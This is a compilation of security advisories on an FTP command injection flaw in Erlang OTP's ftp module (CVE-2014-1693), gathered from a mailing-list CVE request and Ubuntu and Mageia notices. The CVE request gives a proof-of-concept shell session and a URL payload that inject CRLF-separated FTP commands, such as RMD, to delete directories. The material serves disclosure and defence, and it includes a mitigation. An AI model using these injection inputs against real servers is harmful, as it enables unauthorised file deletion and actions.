# CVE Request: Erlang OTP - ftp module - FTP Command Injection

---

*From*: Seba <argos83 () gmail com>

```
Hi,

This has been reported to erlang-bugs mailing list:
<http://erlang.org/pipermail/erlang-bugs/2014-January/003998.html>

There is an FTP Command Injection vulnerability in the "ftp" module.

All those functions that write any string argument in the control
socket seem to be vulnerable:

user/3
user/4
account/2
cd/2
ls/2
nlist/2
rename/3
delete/2
mkdir/2
rmdir/2
recv/2
recv/3
recv_bin/2,
recv_chunk_start/2
send/3
send_bin/3
send_chunk_start/2
append_chunk_start/2
append/2
append/3
append_bin/3

Vulnerability Description
-------------------------

By injecting a \r\n sequence followed by a new command in a function
argument you get the ftp module to write the whole string in the
socket.

E.g. the following erlang shell session:

1> inets:start().
ok
2> {ok, Pid} = inets:start(ftpc, [{host, "127.0.0.1"}]).
{ok,<0.46.0>}
3> ftp:user(Pid, "anonymous", "password\r\nCWD pub\r\nMKD new_dir").
ok
4> ftp:cd(Pid, "/pub\r\nRMD new_dir\r\nPASV").
ok

Generates the following FTP session:

FTP command: Client "127.0.0.1", "USER anonymous"
FTP response: Client "127.0.0.1", "331 Please specify the password."
FTP command: Client "127.0.0.1", "PASS <password>"
FTP response: Client "127.0.0.1", "230 Login successful."
FTP command: Client "127.0.0.1", "CWD pub"
FTP response: Client "127.0.0.1", "250 Directory successfully changed."
FTP command: Client "127.0.0.1", "MKD new_dir"
FTP response: Client "127.0.0.1", "257 "/pub/new_dir" created"
FTP command: Client "127.0.0.1", "CWD /pub"
FTP response: Client "127.0.0.1", "250 Directory successfully changed."
FTP command: Client "127.0.0.1", "RMD new_dir"
FTP response: Client "127.0.0.1", "250 Remove directory operation successful."
FTP command: Client "127.0.0.1", "PASV"
FTP response: Client "127.0.0.1", "227 Entering Passive Mode
(127,0,0,1,130,161)."

Attack Scenario Example
-----------------------

A web server allow users to navigate and download documents.
Internally the web server connects to a private ftp server using OTP
"ftp" module.
An attacker might take advantage of the vulnerability to execute
actions that aren't supposed to be exposed. E.g. delete a directory by
requesting:

<http://www.example.com/list_dir.yaws?dir=/docs/%0d%0aRMD+/docs>

Tested on
---------
 - Erlang OTP: R15B03
 - Ubuntu 12.04 x86_64
 - FTP Sever: vsftpd

Mitigation
----------

Until this is fixed and the proper sanitization is implemented within
the ftp module, string arguments should get "\r" and "\n" removed
before being passed to these functions.

# USN-3571-1: Erlang vulnerabilities

14 February 2018

Several security issues were fixed in Erlang.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 17.10](/security/notices?release=artful)
* [Ubuntu 16.04 ESM](/security/notices?release=xenial)
* [Ubuntu 14.04 ESM](/security/notices?release=trusty)

## Packages

* [erlang](/security/cves?package=erlang) - Concurrent, real-time, distributed functional language

## Details

It was discovered that the Erlang FTP module incorrectly handled certain

CRLF sequences. A remote attacker could possibly use this issue to inject

arbitrary FTP commands. This issue only affected Ubuntu 14.04 LTS.

([CVE-2014-1693](/security/CVE-2014-1693))

It was discovered that Erlang incorrectly checked CBC padding bytes. A

remote attacker could possibly use this issue to perform a padding oracle

attack and decrypt traffic. This issue only affected Ubuntu 14.04 LTS.

([CVE-2015-2774](/security/CVE-2015-2774))

It was discovered that Erlang incorrectly handled certain regular

expressions. A remote attacker could possibly use this issue to cause

Erlang to crash, resulting in a denial of service, or execute arbitrary

code. This issue only affected Ubuntu 16.04 LTS. ([CVE-2016-10253](/security/CVE-2016-10253))

Hanno Böck, Juraj Somorovsky and Craig Young discovered that the Erlang

otp TLS server incorrectly handled error reporting. A remote attacker could

possibly use this issue to perform a variation of the Bleichenbacher attack

and decrypt traffic or sign messages. ([CVE-2017-1000385](/security/CVE-2017-1000385))

##### Ubuntu 16.04

* [erlang](https://launchpad.net/ubuntu/%2Bsource/erlang)
  -
  [1:18.3-dfsg-1ubuntu3.1](https://launchpad.net/ubuntu/%2Bsource/erlang/1%3A18.3-dfsg-1ubuntu3.1)

##### Ubuntu 14.04

* [erlang](https://launchpad.net/ubuntu/%2Bsource/erlang)
  -
  [1:16.b.3-dfsg-1ubuntu2.2](https://launchpad.net/ubuntu/%2Bsource/erlang/1%3A16.b.3-dfsg-1ubuntu2.2)

After a standard system update you need to reboot your computer to make

all the necessary changes.

| [Description](show_bug.cgi?id=14715#c0)  David Walser    2014-12-02 20:12:31 CET  ``` Fedora has issued an advisory on November 19: <https://lists.fedoraproject.org/pipermail/package-announce/2014-December/145017.html>  They fixed it by adding a patch here: <http://pkgs.fedoraproject.org/cgit/erlang.git/commit/?h=f20&id=bc7188bc292d7f41d7dd0567d535cf1614cee597>  They also disabled SSLv3, which is a good idea, here: <http://pkgs.fedoraproject.org/cgit/erlang.git/commit/?h=f20&id=a296fdacf31171784e2c9436725d9fc48b5a321a>  Reproducible:   Steps to Reproduce: ```  David Walser    2014-12-02 20:12:39 CET   Whiteboard: (none) => MGA4TOO  David Walser    2014-12-03 21:32:33 CET   Blocks: (none) => 14674  [Comment 1](show_bug.cgi?id=14715#c1)  David Walser    2014-12-15 20:08:04 CET  ``` Newest Fedora 20 advisory for erlang, containing the SSLv3 disabling: <https://lists.fedoraproject.org/pipermail/package-announce/2014-December/146184.html> ```  [Comment 2](show_bug.cgi?id=14715#c2)  David Walser    2014-12-24 21:31:16 CET  ``` Patched packages uploaded for Mageia 4 and Cauldron.  Advisory: ========================  Updated erlang packages fixes security vulnerability:  An FTP command injection flaw was found in Erlang's FTP module. Several functions in the FTP module do not properly sanitize the input before passing it into a control socket. A local attacker can use this flaw to execute arbitrary FTP commands on a system that uses this module (CVE-2014-1693).  This update also disables SSLv3 by default to mitigate the POODLE issue.

## Updated erlang packages fix security vulnerabilities

Publication date: 26 Dec 2014

Modification date: 26 Dec 2014

Type: security

Affected Mageia releases :
[4](4.html)

CVE:
[CVE-2014-1693](CVE-2014-1693.html)

## Description

```
Updated erlang packages fixes security vulnerability:

An FTP command injection flaw was found in Erlang's FTP module. Several
functions in the FTP module do not properly sanitize the input before passing
it into a control socket. A local attacker can use this flaw to execute
arbitrary FTP commands on a system that uses this module (CVE-2014-1693).

This update also disables SSLv3 by default to mitigate the POODLE issue.

```
